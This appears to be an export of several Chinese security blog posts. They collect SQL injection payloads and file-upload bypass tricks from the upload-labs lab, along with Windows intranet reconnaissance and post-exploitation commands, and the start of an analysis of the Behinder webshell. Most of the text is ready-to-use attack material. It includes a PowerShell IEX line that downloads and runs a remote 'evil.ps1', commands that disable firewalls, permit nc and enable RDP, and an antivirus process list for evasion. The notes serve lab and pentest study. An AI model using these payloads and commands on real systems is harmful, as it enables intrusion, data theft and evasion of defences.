1,&quot;获得的值&quot;,3 into outfile &quot;绝对路径&quot; --+1.必须是绝对路径（路径要是斜杠不能是反斜杠\\，不然会被当成转义） 2.必须是最高权限（不一定是root） 3.使用读写文件时，my.ini 中的 mysqld 必须有 secure-file-priv 参数，如果没有必须加上，如果有，要不将写的文件放到这个参数的默认路径里，要不修改这个路径 读文件 1234select 1,load_file(0x123123),3 --+读文件时需要将绝对路径进行十六进制编码最后在load_file()的外层还可以包一个hex()，这样即便是中文，也可以后期解码这个路径对反斜杠没有要求 sqlmap 可以去跑一个页面的 php 文件（不带任何参数那种），然后加上–forms 参数来自动寻找页面可能存在的表单 虽然关键字不能被十六进制编码，但是查询的字符串可以进行十六进制编码，并等价于原字符串 注入时，先引号，然后万能密码，然后 order by，然后 union select 去正常注入。看中途回显要求，尝试堆叠，报错等其他注入途径 注入时如果需要有=这样的字符，不知道全名的时候，=可以换成 like，然后不知道的地方用% 通配，然后十六进制转换 1where table_schema like %all% //all那里再转成十六进制 可以使用 exists(select …)来排查过滤或者暴力猜解表名 123id=1' and exists(select * from admin)--+ //对admin进行burp爆破 注入时最好去抓包用-r 注入，因为这样可以带上 User-Agent 消息头 注入时有可能你加上–random-agent 这个自动更改消息头的参数会提高成功率 sql 注入的时候不光可注入 GET，POST，还可以抓包注入数据部分的参数（加 * ） 用不了 substr 可以用 mid 替换，效果一样 strstr()不区分大小写 0x01.亦或注入当不知道注入时哪些参数被过滤的时候，可以使用亦或注入亦或符号为^，其运算规则是相同为真，相异为假 注入时使用 length()函数进行判断，length()内部是被考察有可能过滤掉的参数如果页面正常返回，则说明被参数过滤掉了 123index.php?id=5'^(length('and')!=0)%23原理即是：如果and被过滤掉了，length('and')即为0,0!=0显然结果是0，而前面的值为真（'5'），二者相异，整个语句的值为1，所以页面正常返回 如果%23（#）也被过滤掉了，可以尝试再加一次亦或 123index.php?id=5'^(length('and')!=0)^'因为添加的后引号与php文件里的语句一旦合并,内部即形成了''（空值），所以显然为0，与前面的结果1还是相异的，所以也可以正常返回来判断过滤 0x02.报错注入报错注入前提是在后端代码有 Exception 这种异常处理的回显才能在 web 中用，不然即使能报错但是你不知道报错内容 报错注入有十种，详见：https://www.cnblogs.com/wocalieshenmegui/p/5917967.html 最常用的是 123floor()updatexml()extractvalue() updatexml() 此函数格式为 updatexml(目标文件, 路径, 更改值); 而这里的路径必须是 XPath 格式的路径，我们可以利用传入非法路径（但是是一个合理的 sql 语句），来让 updatexml 报错，显示路径中 sql 语句执行后的内容，而目标文件与更改值可以是任意内容 11' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x776562313030322d32)),3) %23 而现在的目的是为了让传入的路径不符合 XPath 路径格式，那就必须加一个让路径格式失效的字符，’#’或者’~’(0x7e)都行 所以现在要用到 concat()函数来将那个字符与后面的语句拼接起来 extractvalue()与 updatexml()同理 floor() 与 rand()随机数函数结合，floor()用于取整https://blog.csdn.net/zpy1998zpy/article/details/80650540https://www.cnblogs.com/litlife/p/8472323.html 0x03.可以使用语句辅助注入substr(str,start,long)str 是待切分的字符串，start 是切分起始位置(下标从 1 开始)，long 是切分长度 if(exp1,exp2,exp3)如果满足 exp1,那么执行 exp2,否则执行 exp3 例如： 1xx' or if((substr((select database()),1,1)='c'),1,0) # #判断数据库第一个字符是否为c 语句替换如果逗号被过滤了，可以使用以下收发替换 if(exp1, exp2, exp3) ====&gt; case when exp1 then exp2 else exp3 end substr(exp1,1, 1) ====&gt; substr(exp1) from 1 for 1 例如： 1xx' or case when (substr((select database()) from 1 for 1)='c') then 1 else 0 end # 如果 substr 被过滤了，可以使用 LOCATE 函数 返回子串 substr 在字符串 str 中的第 p os 位置后第一次出现的位置。如果 substr 不在 str 中返回 0 ps：因为[[Mysql]]对大小写不敏感，所有写的时候用 locate(binary’S’, str, 1) 加个 binary 即可 12xx' or if((locate(binary'c',(select database()),1)=1),1,0) #xx' or if((locate(binary't',(select database()),1)=2),1,0) # 0x04.使用延迟注入123456789基于sleep的延迟 xx' or if(length((select database()))&gt;1,sleep(5),1) #基于笛卡尔乘积运算时间造成的时间延迟xx' or if(length((select database()))&gt;1,(select count(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1) # 基于benchmark的延迟 xx'or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5('a'))),1) #--大概会用2S时间 0x05.堆叠注入 如果能看见源码，源码中有 multi_query()那就很有可能涉及堆叠注入 只要是堆叠注入，那就可以使用 sql 的预定义语句 12345678即在'后直接跟分号结束，然后跟sql语句，最后#收尾-1';show databases;#-1';show tables;#-1';show columns from `1919810931114514`;#-1';show columns from `words`;##注意，以上表名要加反引号``，反引号内的内容可以被作为子命令在其他命令中嵌套输出#例如：ping www.google.com == ping `www.google.com` 如果可以使用堆叠注入，但是有一些关键字被过滤了(例如 select)那么我们可以使用预编译的方法 set 用于设置变量名和值 prepare 用于预备一个语句，并赋予名称，以后可以引用该语句execute 执行语句deallocate prepare 用来释放掉预处理的语句 例如 payload: 1-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;execute stmt;# 0x06.更改表名列名为本身就能回显的来查询语法如下： 12345修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30); 例如 payload: 11'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# 修改完后，可以直接使用万能密码得出 flag： 11' or 1=1# 0x07.二次注入即通过某种方式得到源码后，发现程序对输入的地方做了过滤（比方说转义 addslashs），但是通过注册存到数据库里的内容却是不带 \\ 的。而当我们再去修改密码时，修改的却是之前注册的恶意代码里真正用户的密码，例如： 12345注册时我们注册admin'#但是存储时，程序加了\\，变成了admin\\'#但是在当我们用这个admin'#登录后去修改密码时，内部的sql如下构造$sql = &quot;UPDATE users SET PASSWORD='123' where username='admin'#'and password='$curr_pass'&quot;即我们相当于是修改了admin的密码 盲注原理121' and sleep(5)# 1' and length(database())=2# 因没有回显，所以一般注入的 select 没用，故通过 and 或者别的方式查询时加上一些特定函数，来一个一个爆破猜解数据库的某个字段的字符可以使用 Burpsuite 或者二分法来定位字符 操作基于时间： sleep() if() 12345678猜表的数量：1' and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1)#猜表名字符数：1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1)# 猜表名第一个字符：1' and if(ascii(substr((select table_name from table_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97,sleep(5),1)# 基于布尔： length() ascii() mid() substr() count() 1234567891011121314猜表的数量：1' and (select count(table_name) from information_schema.tables where table_schema=database())=1#猜表长度：1' and (select length(table_name) from information_schema.tables where table_schema=database())=1#limit i,n 限制返回结果的数量i:返回结果的索引值n:返回结果的数量猜表名第一个字符：1' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),0,1))&gt;97#","link":"/2019/12/11/sql%E6%B3%A8%E5%85%A5/"},{"title":"从 php 代码层面分析文件上传漏洞","text":"从 PHP 代码层面分析文件上传漏洞 根据 Upload-Labs 来进行总结 0x00.参考文章 upload-labs 文件上传靶机闯关记录 Upload-labs 通关手册 如果 shell 写的是回显型（phpinfo()）或者是个图片，需要通过另一个[[文件包含漏洞]]漏洞打组合拳，或者将以下包含代码传上去 1234&lt;?php$b = $_GET['a'];include($b);?&gt; 0x01.从客户端 JS 去限制文件扩展名（本地校验）代码1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; }} Bypass 删除关键白名单 JS 代码片段 在白名单里加入恶意扩展名 0x02.检查数据包的 MIME（文件类型）代码123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { //这一段 if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { //这一段 $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; }}即使用$_FILES['upload_file']['type'] == 'image/jpeg'来进行数据包传输的限制 Bypass 仅将数据包中的 Content-Type 修改为合法类型，文件扩展名不变 0x03.对扩展名进行黑名单限制 模板代码 1234567891011121314151617181920212223242526272829303132333435363738$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { //黑名单规则部分 $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);//进行黑名单限制 $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //收尾去空 $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);//对恶意扩展名进行替换操作 //黑名单规则部分 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 1.规则-扩展名进行黑名单限制代码1$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); Bypass 使用一些别名，例如 php 则可以使用 php2php3php4php5phpsphtphtmphtml 使用 Apache 的.htaccess 规则 通过构造当前网页配置文件.htaccess创建一个文件名为.htaccess 的文件，保存格式为 eXtensible Markup Language file内容为： 123456&lt;FilesMatch &quot;cimer&quot;&gt; //cimer可以替换为自己想要的扩展名，后期改这个扩展名上传就好了SetHandler application/x-httpd-php&lt;/FilesMatch&gt;将.htaccess上传到指定页面中（它是配置文件，所以不会被拦截），然后将自己的.php代码更改扩展名名为.cimer（自己起的那个）上传 菜刀连接时同样访问这个****.cimer就好。 使用 Apache 从右向左解析的规则 上传 1.php.bak 或者任意一个编造的扩展名在某些版本可当做 php 来执行（因为 apache 从右到左对文件名进行解析，而 .bak 是 httpd.conf 识别不了的文件名扩展名，故 apache 会自动提取左边的.php） 2.规则-扩展名大小写限制代码1$file_ext = strtolower($file_ext);//转换为小写 Bypass 如果没有大小写限制，那么我们就可以使用 pHp 来进行绕过 3.规则-扩展名首尾去空代码1$file_ext = trim($file_ext);//对扩展名进行首尾去空操作 Bypass 如果没有收尾去空操作，那么我们就可以在扩展名后加空格进行绕过 4.规则-删除末尾的点代码1$file_name = deldot($file_name);//删除末尾的点 Bypass 如果没有删除末尾的点，那么我们就可以使用 1.php.进行绕过 Windows 环境下会自动删除最后的点 5.规则-进行文件流限制代码1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA Bypass 如果没有进行文件流限制，那么我们可以使用上传文件名是 1.php::$DATA 来进行绕过（访问时去除文件流后缀） 1.php:1.txt 是正常文件流，而:$DATA 是当前文件默认文件流 6.规则-对恶意扩展名进行替换代码1$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);//对恶意扩展名进行替换操作 Bypass 注意，即便有这样的替换操作，我们依旧可以使用双写进行绕过 0x04.上传路径可控1.通过 GET 方式控制（URL）代码123456index.php&lt;form action=&quot;?save_path=../upload/&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;&lt;!--就是这里的?save_path=--&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt; &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;&lt;/form&gt; Bypass（%00 截断） 如果路径可控，我们可以先上传一个有一句话的合法类型文件（JPG/GIF 等） 然后我们在可控制路径的地方使用%00 截断，具体操作操作例如将路径更换为你要上传马的路径加上 php 文件名：../upload/1.php%00 然后上传上去就是 1.php,原先的 jpg 不会被上传 2.通过 POST 方式控制代码1234567index.php&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input type=&quot;hidden&quot; name=&quot;save_path&quot; value=&quot;../upload/&quot;/&gt; &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt; &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;&lt;/form&gt; Bypass（0x00 截断） 和 GET 方式大致相似，但在可控路径上添加“一个空格与 a”：../upload/1.php a 空格与 a 的 HEX 分别是 20、61 将 20 改为 00，即可绕过 0x05.检查图片内容1.只检查头两个字节代码12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType;}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} Bypass 只用在 php 文件前加上一行标识 GIF：GIF89aJPG：ff, d8（HEX 里边修改）PNG：89 50 4e 47 0d 0a 1a 0a（HEX 里边修改） 2.通过特别函数来检查图片内容利用 getimagesize()12345678910111213141516171819202122232425262728293031function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename);//使用getimagesize()检查图片 $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} 利用 exif_imagetype()1234567891011121314151617181920212223242526272829303132333435function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename);//通过exif_imagetype()来检查图片内容 switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} Bypass 只用上传个在末尾有加 shell 代码的图片马就好了 0x06.将上传的图片进行重新渲染代码 程序通过 imagecreatefromjpeg()函数调用了 PHP GD 库（GD 库，是 php 处理图形的扩展库），对图片进行了转换 挖洞姿势：特殊的上传技巧，绕过 PHP 图片转换实现远程代码执行（RCE） upload-labs 之 pass 16 详细分析 123456789101112131415161718192021222324252627282930313233关键代码//截取相关后缀名操作if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ //省略了一堆代码 $im = imagecreatefromjpeg($target_path);}else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ //省略了一堆代码 $im = imagecreatefromjpeg($target_path);} Bypass GIF 先上传 GIF，然后将上传的图片下载下来用可以看 16 进制的编辑器进行对比，在未变化的部分加入 shell 代码 PNG 参考上面的文章 JPG 使用 [[JPG_Payload.php]] 这个脚本，注意此脚本最好去传比较小一些的文件，太大了会将 shell 插入错地方导致失败，而且多试几张图片","link":"/2020/01/11/%E4%BB%8EPHP%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"title":"简易内网信息收集","text":"内网信息收集辅助命令1234567891011121314151617181920// 隐藏窗口-W Hidden-WindowStyle Hidden//非交互模式，不为用户提供交互提示-NonI-NonInteractive//使用IEX（Invoke-Expression）进行远程脚本下载-IEX(New-ObjectNet.WebClient).DownloadString(&quot;127.0.0.1/evil.ps1&quot;) //不加载当前用户的配置文件-NoP-NoProfile//显示logo的启动-NoLogo//执行后不退出shell，常用于键盘记录等-noexit 宗旨进入内网的“黑暗森林”后，需要有个大致的判断： 我是谁（whoami 等） 这个机子都有谁，有[[域]]吗，域的账户都有啥（重点关注 3 本地组管理员与全局组管理员），域控的 ip 域机器名是啥 本机信息收集 我的域有其他存活的机子吗，都开放了什么端口 确定域管理员、本地管理员都有谁，登录本台机器的都有谁（有没有域管理员） 当前域控下的活动域都有哪些 杂余命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//查看当前权限whoamiwhoami /all //可以获取域SID//查看完整IP信息ipconfig /all//查看系统信息systeminfosysteminfo | findstr /b /c:&quot;OS&quot;echo %PROCESSOR_ARCHITECTURE% //或者%PATH%啥的，反正是环境变量//查询端口列表netstat -ano//查看计划任务schtasks /query /fo LIST /v//使用telnet逐一验证高危端口是否开启telnet DC 22telnet DC 1443telnet 1.2.3.4 3389//查询路由表route print//查询所有可用接口的ARP缓存表arp -a//查看域控的机器名nltest /DCLIST:hacke//查看域控的主机名nslookup -type=SRV _ldap._tcp//查看代理配置情况reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;//查询远程连接端口（0xd3d就是3389）REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP&quot; /V PortNumber//在Windows Server 2003中开启3389wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowsconnections 1//在Windows Server 2008和Windows Ser ver 2012中开启3389（以下三选一）wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName=&quot;RDP-Tcp&quot;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f//判断当前域控下活动域都有哪些//将域控机器名放在dcs.txt中，域管理员放到admins.txt中FOR /F %I in (dcs.txt) do @echo [+] Querying DC %I &amp;&amp; @netsess -h %I 2&gt;nul &gt;sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | findstr /I %a//通过ping的ICMP协议进行主机探测for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot; net 命令1234567891011121314151617181920212223242526272829303132333435363738394041424344//查看域里的各种基本信息//加domain就是域内操作，会直接将命令放到域控上执行net group /domainnet user /domainnet group &quot;domain admins&quot; /domain //可以在后面加身份来具体查询net localgroup //本地组 //在域内机器上net group /domain 等同于在域控上 net group//如果在本地组里是administrators里边的，及是本地的系统管理员//如果全局组中是domain users 既是普通域用户，如果在全局组中的domain admins 组里边，那么不光是域管理员还是域内所有机器的管理员（即会自动加入到域内机器的 administrtors 组里边）身份如下：Domain Admins //域管理员（完全控制权限）Domain Computers //域内机器Domain Controllers //域控制器Domain Guest //域访客，权限较低Domain Users //域用户Enterprise Admins //企业系统管理员用户（完全控制权限）//查看当前计算机信息以及是否在域下面net config workstation//查看域控服务器net time /domain//查看域密码策略信息net accounts /domain//查询域net view//查询域内所有计算机//dev有可能是开发服务器，web、app有可能是Web服务器，NAS可能是存储服务器，fileserver可能是文件服务器net view /domain:HACKE//查看主机开机时间net statistics workstation//列出或断开本地计算机与所连接客户端的对话net session//查询本机共享列表net share netsh-防火墙相关123456789101112131415161718192021//关闭防火墙netsh firewall set opmode disable //Windows Server 2003之前版本netsh advfirewall set allprofiles state off //Windows Server 2003之后版本//查看防火墙配置netsh firewall show config//允许指定程序进入（Windows Server 2003之前版本）netsh firewall add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable //允许指定程序进入netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow //允许指定程序退出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow//允许某端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow//自定义防火墙日志的存储位置netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\&quot; wmic 参考： Windows WMIC 命令使用详解(附实例) 集合命令集参考 wmic_info 1234567891011121314151617//获取安装的软件、版本信息wmic product get name,version//查询本机的服务信息wmic service list brief//查看启动程序的信息wmic startup get command,caption//查看安装在系统中的补丁wmic qfe get Caption,Description,HotFixID,InstalledOn//查询本机共享列表wmic share get name,path,status//查看域内用户详细信息wmic useraccount get /all ds 命令ds 命令只能在 windows 服务器版本下才能运行 12//查看存在的用户dsquery user tasklist 常见杀毒软件进程名称 进程名 软件名 360sd.exe 360 杀毒 360tray.exe 360 实时防护 ZhuDongFangYu.exe 360 主动防御 KSafeTray.exe 金山卫士 SafeDogUpdateCenter.exe 服务器安全狗 McAfee McShield.exe McAfee egui.exe NOD32 AVP.EXE 卡巴斯基 avguard.exe 小红伞 bdagent.exe BitDefender adfind.exe使用 adfind.exe 下载链接： Adfind nbtscan.exe使用 nbtscan.exe 进行域内存活主机的探测 下载链接： nbtscan 行末的提示对照表 Token 含义 SHARING 该机器中存在正在运行的文件和打印共享服务，但不一定有内容共享 DC 该机器可能是域控制器 U=USER 该机器中有登录名为 User 的用户 IIS 该机器可能安装了 IIS 服务器 EXCHANGE 该机器可能安装了 Exchange NOTES 该机器可能安装了 Lotus Notes 电子邮件客户端 ? 没有识别出该机器的 NetBIOS 资源（可以使用-F 选项再次扫描） [[Metasploit]]使用 TCP 模块进行端口扫描1234567search portscanuse auxiliary/scanner/portscan/tcp //或者使用其他端口扫描软件set RHOSTS 1.2.3.4set ports 1-4000set THREADS 10run [[powershell]]框架 nishang powersploit","link":"/2021/06/11/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"title":"冰蝎(BehinderV3.X) 原理分析","text":"V2.1 冰蝎-特征检测及报文解密 冰蝎 v2.0.1-动态二进制加密网站管理客户端源码分析 红蓝对抗——加密 Webshell“冰蝎” 流量 100% 识别 V3.0 原理解释： 冰蝎 Behinder 3.X （这个原理针对Beta1，最新您Beta6在content部分加了混淆） 冰蝎的前世今生：3.0 新版本下的一些防护思考 安全实验室 | 冰蝎 3.0 绕过 HIDS 原理分析 冰蝎 3.0-分析系列 3-jsp-beta4,5 冰蝎 3.0 流量分析与还原 Behinder3 原理 承接冰蝎 2，冰蝎 2 的每次连接会使用一个随机令牌 pass（即通过 Shell 交互过程中的 HTTP 请求特征可作为特征拦截）；流程为：密钥协商-&gt;加密传输，而密钥协商这块会被作为特征而被拦截；通过 Webshell 上传时的流量特征来检测；通过利用 rasp 机制来检测，具体原理文章详见 冰蝎-特征检测及报文解密 而冰蝎 3 取消了随机令牌，固定了令牌在 shell.php\\asp\\jsp 等里边，其代码是： 12345 //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond$key=&quot;e45e329feb5d925b&quot;;//机理md5(&quot;admin&quot;)\\[0:16\\]； 冰蝎 3 使用了 AES 对称加密与 Base64 的结合，流量中的数据需要使用密码为 e45e329feb5d925b（rebeyond 的 md5 前 16 位），偏移量为 0123456789abcdef，AES 加密模式一定为 CBC AES 解密 base64 解密 通过 wireshark 抓包，冰蝎会发送两次 POST 包，接收到两次包，即两次客户端-服务端交互 第一次交互 客户端发送 冰蝎首先发送一个通过AES 解密，再通过 Base64 解密为如下内容的包（解密流程看 冰蝎 Behinder 3.X ），来建立连接同时发送content内容作为连接成功的配对，如果对方服务器返回了content的内容，证明连接成功 1234567891011121314151617181920212223242526//这段数据包在实际流量中应该是Base64再AES后的密文@error_reporting(0);function main($content){ $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION['k']; echo encrypt(json_encode($result),$key);}function encrypt($data,$key){ if(!extension_loaded('openssl')) { for($i=0;$i&lt;strlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1&amp;15]; } return $data; } else { return openssl_encrypt($data, &quot;AES128&quot;, $key); }//下面这段content在BehinderV3.0 